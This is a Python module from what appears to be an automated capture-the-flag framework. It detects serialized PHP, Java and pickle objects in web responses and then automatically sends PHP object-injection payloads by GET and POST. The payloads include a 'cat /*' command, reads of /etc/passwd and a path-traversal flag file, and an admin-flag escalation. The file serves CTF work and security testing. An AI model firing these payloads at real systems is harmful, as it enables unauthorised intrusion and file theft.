"""
Deserialization Vulnerability Detection

This unit will check web responses for serialized object patterns from
PHP, Python (pickle), and Java. If serialized data is detected, the unit
will attempt known deserialization payloads for PHP (``__wakeup``,
``__destruct``) to trigger potential vulnerabilities.

This unit inherits from :class:`flagr.units.web.WebUnit` as that contains
lots of predefined variables that can be used throughout multiple web units.

.. warning::

    This unit automatically attempts to perform malicious actions on the
    target. **DO NOT** use this in any circumstances where you do not have the
    authority to operate!

"""

import base64
import re
from urllib.parse import quote as url_quote

import requests

from flagr.unit import NotApplicable
from flagr.units.web import WebUnit


# Patterns that indicate serialized objects in an HTTP response
SERIALIZED_PATTERNS = {
    "php_object": re.compile(r'O:\d+:"[^"]+"\s*:\s*\d+\s*:\s*\{'),
    "php_array": re.compile(r'a:\d+:\{'),
    "php_string": re.compile(r's:\d+:"[^"]*";'),
    "python_pickle_b64": re.compile(
        r"[A-Za-z0-9+/]{4,}={0,2}"
    ),  # broad; refined in detection
    "java_b64": re.compile(r"rO0[A-Za-z0-9+/]+=*"),
    "java_hex": re.compile(r"aced0005"),
}
"""
Regex patterns used to detect serialized objects in HTTP responses.
"""

# PHP deserialization payloads using __wakeup and __destruct
PHP_PAYLOADS = [
    # __wakeup with system command
    'O:8:"Exploiter":1:{s:3:"cmd";s:6:"cat /*";}',
    # __destruct with file read
    'O:8:"Exploiter":1:{s:4:"file";s:10:"/etc/passwd";}',
    # Generic __wakeup trigger
    'O:6:"Helper":0:{}',
    # __destruct trigger with flag read
    'O:4:"Flag":1:{s:4:"file";s:9:"flag.txt";}',
    # Attempt common CTF class names
    'O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}',
    'O:6:"Upload":1:{s:8:"filename";s:11:"../flag.txt";}',
]
"""
PHP deserialization payloads that attempt to trigger __wakeup and __destruct
magic methods in common CTF challenge patterns.
"""


def _looks_like_pickle_b64(data):
    """
    Check whether a base64-encoded string looks like a Python pickle stream.

    :param data: The base64 string to test.
    :return: True if the decoded bytes start with a pickle opcode.
    """
    try:
        decoded = base64.b64decode(data)
        # Python pickle protocol markers
        return decoded[:1] in (b"\x80", b"(", b"]", b"}")
    except Exception:
        return False


class Unit(WebUnit):

    GROUPS = ["web", "deserialize"]
    """
    These are "tags" for a unit. Considering it is a Web unit, "web"
    is included, as well as the name of the unit, "deserialize".
    """

    RECURSE_SELF = False
    """
    This unit should not recurse into itself.
    """

    PRIORITY = 45
    """
    Priority works with 0 being the highest priority, and 100 being the
    lowest priority. 50 is the default priority. This unit has a slightly
    higher priority.
    """

    def __init__(self, *args, **kwargs):
        """
        The constructor is included to first fetch the target URL and
        scan the response for serialized object patterns. If no patterns
        are found, this unit will abort.
        """

        super(Unit, self).__init__(*args, **kwargs)

        url = self.target.upstream.decode("utf-8", errors="replace")

        try:
            r = requests.get(url, timeout=10)
        except requests.exceptions.ConnectionError:
            raise NotApplicable("cannot reach url")
        except requests.exceptions.Timeout:
            raise NotApplicable("request timed out")

        self.response = r
        self.base_url = self.target.url_root.rstrip("/")

        # Detect serialized patterns in the response
        self.detections = []

        body = r.text

        # PHP serialized objects
        if SERIALIZED_PATTERNS["php_object"].search(body):
            self.detections.append("php")
        elif SERIALIZED_PATTERNS["php_array"].search(body):
            self.detections.append("php")
        elif SERIALIZED_PATTERNS["php_string"].search(body):
            self.detections.append("php")

        # Java serialized objects (base64-encoded rO0 or hex aced)
        if SERIALIZED_PATTERNS["java_b64"].search(body):
            self.detections.append("java")
        elif SERIALIZED_PATTERNS["java_hex"].search(body):
            self.detections.append("java")

        # Python pickle (base64-encoded \x80 prefix)
        b64_candidates = SERIALIZED_PATTERNS["python_pickle_b64"].findall(body)
        for candidate in b64_candidates:
            if len(candidate) >= 8 and _looks_like_pickle_b64(candidate):
                self.detections.append("python_pickle")
                break

        if not self.detections:
            raise NotApplicable("no serialized object patterns found in response")

    def enumerate(self):
        """
        Yield each detected serialization format for evaluation.

        :return: A generator, yielding detection type strings.
        """

        for detection in self.detections:
            yield detection

    def evaluate(self, case):
        """
        Evaluate the target. For each detected serialization format,
        attempt known deserialization payloads and register any
        interesting responses.

        :param case: A detection type string returned by ``enumerate``.

        :return: None. This function should not return any data.
        """

        detection_type = case
        url = self.target.upstream.decode("utf-8", errors="replace")

        self.manager.register_data(
            self,
            "Deserialization detected: {} format at {}".format(detection_type, url),
            recurse=False,
        )

        if detection_type == "php":
            self._try_php_payloads(url)
        elif detection_type == "java":
            self.manager.register_data(
                self,
                "Java serialized object detected at {} (rO0/aced pattern)".format(url),
                recurse=False,
            )
        elif detection_type == "python_pickle":
            self.manager.register_data(
                self,
                "Python pickle detected at {} (base64 \\x80 prefix)".format(url),
                recurse=False,
            )

    def _try_php_payloads(self, url):
        """
        Attempt PHP deserialization payloads via GET and POST parameters.

        :param url: The target URL.
        """

        for payload in PHP_PAYLOADS:
            # Try via GET parameter
            try:
                test_url = "{0}?data={1}".format(url.rstrip("/"), url_quote(payload))
                r = requests.get(test_url, timeout=10)

                if r.status_code == 200 and len(r.text) > 0:
                    # Check if the response differs from the original
                    if r.text != self.response.text:
                        self.manager.register_data(
                            self,
                            "PHP deserialize response (GET): {} -> {}".format(
                                payload[:60], r.text[:500]
                            ),
                        )
                        self.manager.find_flag(self, r.text)

            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                pass

            # Try via POST parameter
            try:
                r = requests.post(
                    url,
                    data={"data": payload},
                    timeout=10,
                )

                if r.status_code == 200 and len(r.text) > 0:
                    if r.text != self.response.text:
                        self.manager.register_data(
                            self,
                            "PHP deserialize response (POST): {} -> {}".format(
                                payload[:60], r.text[:500]
                            ),
                        )
                        self.manager.find_flag(self, r.text)

            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                pass
